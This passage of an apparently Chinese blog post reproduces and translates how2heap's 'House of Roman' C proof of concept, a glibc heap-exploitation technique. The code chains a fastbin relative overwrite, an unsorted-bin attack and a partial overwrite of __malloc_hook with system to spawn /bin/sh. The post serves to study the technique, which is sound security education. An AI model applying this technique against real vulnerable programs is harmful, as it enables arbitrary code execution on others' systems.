first 4 bits of randomness come into play. </span></span><br><span class="line"><span class="comment">The first 12 bits of the LibC address are deterministic for the address. </span></span><br><span class="line"><span class="comment">However, the next 4 (for a total of 2 bytes) are not. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">So, we have to brute force 2^4 different possibilities (16) </span></span><br><span class="line"><span class="comment">in order to get this in the correct location. This &#x27;location&#x27; </span></span><br><span class="line"><span class="comment">is different for each version of GLibC (should be noted).</span></span><br><span class="line"><span class="comment">After doing this relative overwrite, the fastbin looks like the following:</span></span><br><span class="line"><span class="comment">0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (__malloc_hook - 0x23).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Relatively overwrite the main_arena pointer to point to a valid </span></span><br><span class="line"><span class="comment">chunk close to __malloc_hook.</span></span><br><span class="line"><span class="comment">///// <span class="doctag">NOTE:</span> In order to make this exploit consistent </span></span><br><span class="line"><span class="comment">(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\</span></span><br><span class="line"><span class="comment">In the actual attack, this values would need to be specific </span></span><br><span class="line"><span class="comment">to a version and some of the bits would have to be brute forced </span></span><br><span class="line"><span class="comment">(depending on the bits).</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Use a relative overwrite on the main_arena pointer in the fastbin.\n\</span></span><br><span class="line"><span class="string">Point this close to __malloc_hook in order to create a fake fastbin chunk\n&quot;</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> __malloc_hook_adjust = __malloc_hook - <span class="number">0x23</span>; <span class="comment">// We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The relative overwrite</span></span><br><span class="line"><span class="type">int8_t</span> byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; </span><br><span class="line"><span class="type">int8_t</span> byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">fake_libc_chunk[<span class="number">0</span>] = byte1; <span class="comment">// Least significant bytes of the address.</span></span><br><span class="line">fake_libc_chunk[<span class="number">1</span>] = byte2; <span class="comment">// The upper most 4 bits of this must be brute forced in a real attack.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Two filler chunks prior to the __malloc_hook chunk in the fastbin. </span></span><br><span class="line"><span class="comment">// These are fastbin_victim and fake_libc_chunk.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Get the fake chunk pointing close to __malloc_hook\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">In a real exploit, this would fail 15/16 times\n\</span></span><br><span class="line"><span class="string">because of the final half byet of the malloc_hook being random\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the 4 bit brute force did not work, this will crash because </span></span><br><span class="line"><span class="comment">// of the chunk size not matching the bin for the chunk. </span></span><br><span class="line"><span class="comment">// Otherwise, the next step of the attack can begin.</span></span><br><span class="line"><span class="type">uint8_t</span>* malloc_hook_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Passed step 1 =)\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Part 2: Unsorted_bin attack </span></span><br><span class="line"><span class="comment">Now, we have control over the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">However, we do not know the address of LibC still. So, we cannot </span></span><br><span class="line"><span class="comment">do much with this attack. In order to pop a shell, we need </span></span><br><span class="line"><span class="comment">to get an address at the location of the __malloc_hook.</span></span><br><span class="line"><span class="comment">We will use the unsorted_bin attack in order to change the value </span></span><br><span class="line"><span class="comment">of the __malloc_hook with the address of main_arena + 0x68. </span></span><br><span class="line"><span class="comment">For more information on the unsorted_bin attack, review </span></span><br><span class="line"><span class="comment">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.</span></span><br><span class="line"><span class="comment">For a brief overview, the unsorted_bin attack allows us to write</span></span><br><span class="line"><span class="comment">main_arena + 0x68 to any location by altering the chunk-&gt;bk of</span></span><br><span class="line"><span class="comment">an unsorted_bin chunk. We will choose to write this to the </span></span><br><span class="line"><span class="comment">location of __malloc_hook.</span></span><br><span class="line"><span class="comment">After we overwrite __malloc_hook with the main_arena, we will </span></span><br><span class="line"><span class="comment">edit the pointer (with a relative overwrite) to point to a </span></span><br><span class="line"><span class="comment">one_gadget for immediate code execution.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Again, this relative overwrite works well but requires an additional </span></span><br><span class="line"><span class="comment">1 byte (8 bits) of brute force.</span></span><br><span class="line"><span class="comment">This brings the chances of a successful attempt up to 12 bits of </span></span><br><span class="line"><span class="comment">randomness. This has about a 1/4096 or a 0.0244% chance of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The steps for phase two of the attack are explained as we go below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Start Step 2: Unsorted_bin attack\n\n\</span></span><br><span class="line"><span class="string">The unsorted bin attack gives us the ability to write a\n\</span></span><br><span class="line"><span class="string">large value to ANY location. But, we do not control the value\n\</span></span><br><span class="line"><span class="string">This value is always main_arena + 0x68. \n\</span></span><br><span class="line"><span class="string">We point the unsorted_bin attack to __malloc_hook for a \n\</span></span><br><span class="line"><span class="string">relative overwrite later.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// Don&#x27;t want to consolidate</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Put chunk into unsorted_bin\n&quot;</span>);</span><br><span class="line"><span class="comment">// Free the chunk to create the UAF</span></span><br><span class="line"><span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* /// <span class="doctag">NOTE:</span> The last 4 bits of byte2 would have been brute forced earlier. \\\ </span></span><br><span class="line"><span class="comment"> However, for the sake of example, this has been calculated dynamically. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">__malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// This subtract 0x10 is needed because of the chunk-&gt;fd doing the actual overwrite on the unsorted_bin attack.</span></span><br><span class="line">byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; </span><br><span class="line">byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use another relative offset to overwrite the ptr of the chunk-&gt;bk pointer.</span></span><br><span class="line"><span class="comment">// From the previous brute force (4 bits from before) we </span></span><br><span class="line"><span class="comment">// know where the location of this is at. It is 5 bytes away from __malloc_hook.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Overwrite last two bytes of the chunk to point to __malloc_hook\n&quot;</span>);</span><br><span class="line">unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// Byte 0 of bk. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// //// <span class="doctag">NOTE:</span> Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///</span></span><br><span class="line">unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Trigger the unsorted bin attack.</span></span><br><span class="line"><span class="comment">This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.</span></span><br><span class="line"><span class="comment">A few things do happen though: </span></span><br><span class="line"><span class="comment">- This makes the unsorted bin (hence, small and large too) </span></span><br><span class="line"><span class="comment">   unusable. So, only allocations previously in the fastbin can only be used now.</span></span><br><span class="line"><span class="comment">- If the same size chunk (the unsorted_bin attack chunk) </span></span><br><span class="line"><span class="comment">   is NOT malloc&#x27;ed, the program will crash immediately afterwards. </span></span><br><span class="line"><span class="comment">   So, the allocation request must be the same as the unsorted_bin chunk.</span></span><br><span class="line"><span class="comment">The first point is totally fine (in this attack). But, in more complicated </span></span><br><span class="line"><span class="comment">programming, this can be an issue.</span></span><br><span class="line"><span class="comment">The second just requires us to do the same size allocaton as the current chunk.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Trigger the unsorted_bin attack\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> system_addr = (<span class="type">long</span> <span class="type">long</span>)dlsym(RTLD_NEXT, <span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Passed step 2 =)\n\n\n&quot;</span>);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Step 3: Set __malloc_hook to system</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The chunk itself is allocated 19 bytes away from __malloc_hook. </span></span><br><span class="line"><span class="comment">So, we use a realtive overwrite (again) in order to partially overwrite </span></span><br><span class="line"><span class="comment">the main_arena pointer (from unsorted_bin attack) to point to system.</span></span><br><span class="line"><span class="comment">In a real attack, the first 12 bits are static (per version). </span></span><br><span class="line"><span class="comment">But, after that, the next 12 bits must be brute forced. </span></span><br><span class="line"><span class="comment">/// <span class="doctag">NOTE:</span> For the sake of example, we will be setting these values, instead of brute forcing them. \\\</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 3: Set __malloc_hook to system/one_gadget\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\</span></span><br><span class="line"><span class="string">we can use a relative overwrite to point this to system or a one_gadget.\n\</span></span><br><span class="line"><span class="string">Note: In a real attack, this would be where the last 8 bits of brute forcing\n\</span></span><br><span class="line"><span class="string">comes from.\n&quot;</span>);</span><br><span class="line">malloc_hook_chunk[<span class="number">19</span>] = system_addr &amp; <span class="number">0xff</span>; <span class="comment">// The first 12 bits are static (per version).</span></span><br><span class="line"></span><br><span class="line">malloc_hook_chunk[<span class="number">20</span>] = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last 4 bits of this must be brute forced (done previously already).</span></span><br><span class="line">malloc_hook_chunk[<span class="number">21</span>] = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last byte is the remaining 8 bits that must be brute forced.</span></span><br><span class="line">malloc_hook_chunk[<span class="number">22</span>] = (system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>; <span class="comment">// If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.</span></span><br><span class="line"><span class="comment">// In a real example, you would probably want to use a one_gadget. </span></span><br><span class="line"><span class="comment">// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter</span></span><br><span class="line"><span class="comment">// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. </span></span><br><span class="line"><span class="comment">// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Pop Shell!&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>((<span class="type">long</span> <span class="type">long</span>)shell);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>接下来进行翻译,翻译太长了到<code>200</code>行之后就<code>AI</code>跑了，在翻译的时候就感觉<code>how2heap</code>的这个实验说明部分有点啰嗦.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE     <span class="comment">/* for RTLD_NEXT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shell = <span class="string">&quot;/bin/sh\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">借助于how2heap里面的ubuntu 16.04 的glibc_build.sh脚本,这个技巧可以被测试在GLibc2.23、2.24中.对于Glibc2.25版本能在Ubuntu17.04中被测试.</span></span><br><span class="line"><span class="comment">编译指令: gcc -fPIE -pie house_of_roman.c -o house_of_roman</span></span><br><span class="line"><span class="comment">这个POC被Maxwell Dulin (Strikeout)所写</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用这个初始化是为了关闭printf的缓冲区(扰乱堆的对齐)</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">这个技巧主要的目标是一个不泄露地址的堆块从而get shell的利用技术.</span></span><br><span class="line"><span class="comment">这个技巧主要使用相对地址覆盖技术,为了在不知道指针准确值的条件下得到一个恰当位置的指针.</span></span><br><span class="line"><span class="comment">第一步是获取一个指向__malloc_hook附近的指针(可以是指向__malloc_hook地址内部或者也可以是指向__malloc_hook附近的) </span></span><br><span class="line"><span class="comment">这一步能被下方创建一个fastbin的过程实现:</span></span><br><span class="line"><span class="comment">ptr_to_chunk -&gt; ptr_to_libc. 之后, 我们替换ptr_to_libc</span></span><br><span class="line"><span class="comment"> (使用相对地址修改)使其指向ptr_to_libc. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">接下去一个步骤是在__malloc_hook这边执行unsorted bin attack.</span></span><br><span class="line"><span class="comment">(由先前的攻击使得__malloc_hook是可控的). 我们通过相对地址修改替换掉the chunk-&gt;bk从而可以进行unsorted_bin attackwe</span></span><br><span class="line"><span class="comment">最后, 在完成unsorted_bin attack后放置一个libc的地址的值在__malloc_hook内部,我们使用另一个相对地址覆盖到__malloc_hook使得__malloc_hook指向一个one_gadget,system或者一些其他的函数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">现在,下一次我们执行malloc后我们就能弹shell了! :) </span></span><br><span class="line"><span class="comment">然而, 做这个需要一个代价: 12 bits未知数必须要爆破出来(0.02% chance).</span></span><br><span class="line"><span class="comment">最初的*House of Roman* write up在下面这篇文章中</span></span><br><span class="line"><span class="comment"> https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.</span></span><br><span class="line"><span class="comment">这个技巧要求通过UAF或者一些溢出能够写fastbin和unsorted bin中的指针. 总之,这个技术要求要很好的堆布局(对堆大小的申请和对堆的释放需要比较精通)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* introduction = <span class="string">&quot;\n欢迎来到House of Roman\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;这时一个针对不泄露地址的堆利用技术.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;这个攻击一共有三个步骤: \n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;1. 将a fastbin chunk指向__malloc_hook.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;2. 对__malloc_hook进行the unsorted_bin attack.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;3. 相对修改被写入到__malloc_hook中的main_arena地址.\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;以上提及的所有内容都是基于两个主要的概念:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;相对修改地址和堆风水.\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;然而, 这个技术需要一个代价:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;12-bits需要被爆破.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;这意味着这个技术利用成功的概率只有1/4096(0.02%)成功.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;**注意**: 这个利用技术的目的是,我们能设置随机值为了报保持一致\n\n\n&quot;</span>;</span><br><span class="line"><span class="built_in">puts</span>(introduction);</span><br><span class="line">init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一部分: Fastbin Chunk指向__malloc_hook</span></span><br><span class="line"><span class="comment">使得main_arena在fastbin chunk中是利用的是第一步.</span></span><br><span class="line"><span class="comment">这需要大量的堆风水将其对齐. </span></span><br><span class="line"><span class="comment">然而, 乍一款, 它的过程如下:</span></span><br><span class="line"><span class="comment">首先, 我们需要得到一个处于fastbin的堆块(前一个堆块),这个堆块的fd指针还需要指向一个堆块(后一个堆块).</span></span><br><span class="line"><span class="comment">第二, 我们要将前一个堆块指向另一个堆块(这个堆块要求其fd指针要指向Libc中的某个位置,这就说明我们可以有好几种办法来满足这个要求)</span></span><br><span class="line"><span class="comment">以下的所有设置是为了完成上面提到的所有要求从而进行完美的相对地址修改.&quot;;</span></span><br><span class="line"><span class="comment">获得一个指向libc的指针能通过下面两种方式: </span></span><br><span class="line"><span class="comment">- 从 small/large/unsorted_bins 割下来一个chunk </span></span><br><span class="line"><span class="comment">得到分配的大小x70. </span></span><br><span class="line"><span class="comment">- 修改一个small/large chunk的size位使得伪造出程序知道前一个堆块被使用即size位为0x71.</span></span><br><span class="line"><span class="comment">举个例子, 在这里使用第一个方式因为它要求更少的漏洞点(也就是更容易实现).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;第一步: 将fastbin chunk指向__malloc_hook\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;设置chunks通过堆分水和相对地址修改.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用这个作为UAF利用的chunk,之后堆这个chunk进行编辑,编辑这个chunk的指针使得这个指针指向Libc中某个位置.</span></span><br><span class="line"><span class="type">uint8_t</span>* fastbin_victim = <span class="built_in">malloc</span>(<span class="number">0x60</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配下面这个堆块是为了堆地址有一个相对较好的对齐</span></span><br><span class="line"><span class="comment">// 之后的偏移 (为了阻止只想要修改简单的一个字节为了阻止堆上4位的爆破).</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目前偏移为 0x100</span></span><br><span class="line"><span class="type">uint8_t</span>* main_arena_use = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目前偏移为 0x190</span></span><br><span class="line"><span class="comment">// 这个指针将在main_arena_use中被用来一个被使用来相对偏移</span></span><br><span class="line"><span class="type">uint8_t</span>* relative_offset_heap = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放这个main_arena_use变量指向的chunk,释放后这个chunk就会被放入unsorted_bin中.</span></span><br><span class="line"><span class="comment">// 这个chunk释放后将有指向main_arena + 0x68的指针,(即fd和bk这两个指针中指向的是main_arena + 0x68的地址).</span></span><br><span class="line"><span class="built_in">free</span>(main_arena_use);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">获取一部分the unsorted_bin中的chunk (也就是我们刚释放的chunk的一部分). </span></span><br><span class="line"><span class="comment">因为这个chunk的fd和bj指针将包含指向main_aren的指针,所以这真是我们想要的</span></span><br><span class="line"><span class="comment">(之后用于相对地址修改).</span></span><br><span class="line"><span class="comment">这个size特别的要被设置为0x60,也就是我们之后会放这个chunk到管理size为0x70的fasbin链表中.</span></span><br><span class="line"><span class="comment">size位一定要求0x70,因为__malloc_hook那边我们相当于一个伪造的chunk,从fasbin链表取出时程序会对chunk的size位进行检查,而__malloc_hook附近我们能使用的size只能为0x7f.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;分配一个有在fd指针中有指向Libc main_arena的chunk.\n&quot;</span>);</span><br><span class="line"><span class="comment">//Offset 0x100. Has main_arena + 0x68 in fd and bk.</span></span><br><span class="line"><span class="type">uint8_t</span>* fake_libc_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//// 注意: 这不是攻击的一部分... \\\</span></span><br><span class="line"><span class="comment">// 为了找到偏移地址,这时我们就要计算__malloc_hook,因此这个利用对Glibc的版本有影响</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> __malloc_hook = ((<span class="type">long</span>*)fake_libc_chunk)[<span class="number">0</span>] - 